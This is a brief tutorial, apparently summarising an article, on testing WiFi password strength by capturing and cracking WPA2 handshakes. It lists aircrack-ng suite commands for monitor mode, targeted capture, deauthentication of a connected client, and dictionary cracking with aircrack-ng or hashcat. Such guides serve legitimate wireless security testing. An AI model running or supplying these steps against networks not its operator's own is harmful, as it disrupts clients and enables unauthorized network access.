## Use case

The article discusses how to capture and crack WPA2 handshakes to test the strength of WiFi passwords, which is crucial for securing wireless networks against unauthorized access.

## Steps to test

1. Put your WiFi adapter into monitor mode using 'sudo airmon-ng start wlan0'.
2. Scan for nearby networks to find your test AP's BSSID and channel with 'sudo airodump-ng wlan0mon'.
3. Focus the capture on your target network using 'sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon'.
4. Send a deauthentication frame to a connected client with 'sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon' to capture the handshake.
5. Run a dictionary attack with aircrack-ng using 'aircrack-ng -w wordlist.txt -b <BSSID> capture-01.cap' or use hashcat with 'hashcat -m 22000 capture.hc22000 wordlist.txt'.
